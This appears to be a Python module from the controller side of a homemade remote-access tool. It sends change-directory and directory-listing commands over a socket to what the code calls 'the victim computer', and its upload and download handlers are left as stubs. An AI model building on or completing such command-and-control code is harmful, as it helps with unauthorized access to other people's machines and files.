"""
Functions for file manipulation
"""

from shlex import split as shlexSplit
# import my stuff
from consts import *

"""
files.handleCD(cmd[3:])
	elif cmd.startswith('ls') or cmd.startswith('dir'):
		files.handleLS(cmd)
	elif cmd.startswith('upload'):
		files.handleUpload(cmd)
	elif cmd.startswith('download'):
		files.handleDownload(cmd)
"""
currentDirectory = ''

"""
Change the current directory
Expects a string and socket as arguments
The string should be the name of the directory to change to
The socket will be used to send the command to the victim computer
On success, 'currentDirectory' will be updated
On error, the error is printed and nothing happens
Returns nothing
"""
def handleCD(dir, mainSock):
	global currentDirectory
	# pass command to victim
	mainSock.sendall(bytes([CHANGE_DIR]) + dir.encode('UTF-8') + b'\0')
	# get response
	response = mainSock.recv(4096).decode('UTF-8')
	if not response:
		print('ERROR: Socket connection closed!')
	if response.startswith('SUCCESS:'):
		currentDirectory = response[8:]
	else:
		print(f'ERROR: {response[6:]}')

"""
List the contents of a directory
Expects a string and socket as arguments
The string is the command provided and will be checked for an optional directory argument
	If no directory is provided, the current directory's contents will be printed
	If a directory is provided, that directory's contents will be printed
The socket will be used to send the command to the victim computer
On success, the directory contents will be printed
On error, the error is printed and nothing happens
Returns nothing
"""
def handleLS(cmd, mainSock):
	# TODO - add support for optional target directory argument
	# remember, can receive 'ls' or 'dir' as the command
	print('Optional directory argument not yet implemented!')
	print('Printing contents of current directory...')
	# pass command to victim
	mainSock.sendall(bytes([LIST_DIR, 0]))
	# get response
	# TODO - get size of return string
	#		 for now just assume it won't be bigger than 16KB
	response = mainSock.recv(16384).decode('UTF-8')
	if not response:
		print('ERROR: Socket connection closed!')
	if response.startswith('SUCCESS:'):
		print(response[8:])
	else:
		print(f'ERROR: {response[6:]}')

def handleUpload(cmd, mainSock):
	print('TODO')

def handleDownload(cmd, mainSock):
	print('TODO')
